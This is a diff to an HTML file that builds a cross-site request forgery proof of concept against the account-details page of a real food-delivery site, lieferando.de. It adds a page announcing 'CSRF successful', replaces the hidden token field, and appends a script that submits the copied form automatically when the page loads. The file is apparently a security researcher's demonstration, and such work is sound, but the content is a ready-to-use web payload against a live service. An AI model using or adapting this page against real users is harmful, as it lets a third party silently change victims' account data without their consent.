@@ -1,6 +1,17 @@
-<form method="post" action="https://www.lieferando.de/en/myaccount/my-details">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <h1><b>CSRF successful</b></h1>
+</body>
+</html>
+        <form method="post" action="https://www.lieferando.de/en/myaccount/my-details">
             <input type="hidden" name="type" value="data">
-            <input type="hidden" name="488efd5a18" value="34d2119b38fe9b2215b7b7e84d4ed32a53817edb1fb8744d98078171427b727c">
+            <input type="hidden" name="2521d645af" value="523a6ca8c6bf12888c4c1643806fdec3935dae5c786776f5447cb9a8ae389d84">
 
             <div class="grid-11">
                 <p class="nawlabel">Name</p>
@@ -46,3 +57,7 @@
                        class="button details-button">
             </div>
         </form>
+
+        <script>
+            document.forms[0].submit();
+        </script>
